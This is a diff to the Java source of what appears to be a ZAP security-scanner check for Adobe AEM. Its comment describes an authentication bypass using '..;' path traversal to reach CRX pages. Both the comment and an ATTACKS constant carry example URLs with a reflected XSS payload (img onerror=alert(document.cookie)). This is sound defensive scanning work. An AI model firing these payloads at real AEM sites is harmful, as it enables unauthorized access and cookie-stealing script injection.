@@ -20,11 +20,11 @@ import org.zaproxy.zap.extension.prodscan.util.HttpMessageWrapperUtil;
  * TODO: implement fuzzing
  *
  * Affects all servlets that use ServletResolverConstants.SLING_SERVLET_PATHS or @SlingServletPaths. Basically everybody can access any of those servlets even without authentication
- * https://<domain>/<single-element-that-does-not-get-rewritten-by-dispatcher-internally>/..;<your-servlet-plus-any-allowed-extension>
+ * https://<domain>/<PATH_PREFIX>/..;<your-servlet-plus-any-allowed-extension>
  *
  * this also affects the crx development bundle, so if you have those enabled you can do something like
- * https://<domain>/content/..;/crx/explorer/ui/acltest.jsp?Path=/&testPri[…]ons=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E
- * https://<domain>/etc.clientlibs/..;/crx/explorer/ui/acltest.jsp?Path=/[…]ons=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E
+ * https://<domain>/content/..;/crx/explorer/ui/acltest.jsp?Path=/&testPrincipal=&actions=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E
+ * https://<domain>/etc.clientlibs/..;/crx/explorer/ui/acltest.jsp?Path=/&testPrincipal=&actions=%3Cimg%20src=x%20onerror=alert(document.cookie)%3E
  * https://<domain>/etc.clientlibs/..;/crx/de/index.jsp
  * */
 public class ACLTestXSS extends AbstractHostScan {
@@ -32,6 +32,9 @@ public class ACLTestXSS extends AbstractHostScan {
     public static final int ID = 5005;
 
     private static final String MESSAGE_PREFIX = "prodScanAEM.acltest.xss";
+
+    private static final Set<String> PATH_PREFIX = new TreeSet<>(
+            Arrays.asList("/etc.clientlibs/", "/content/", "/apps/", "/etc/", "/var/", "/bin/", "/servlets/"));
 
     private static final Set<String> ATTACKS = new TreeSet<>(Arrays.asList(
             "/content/..;/crx/explorer/ui/acltest.jsp?Path=/&testPrincipal=&actions=<img src=x onerror=alert(''{0}'')>"));
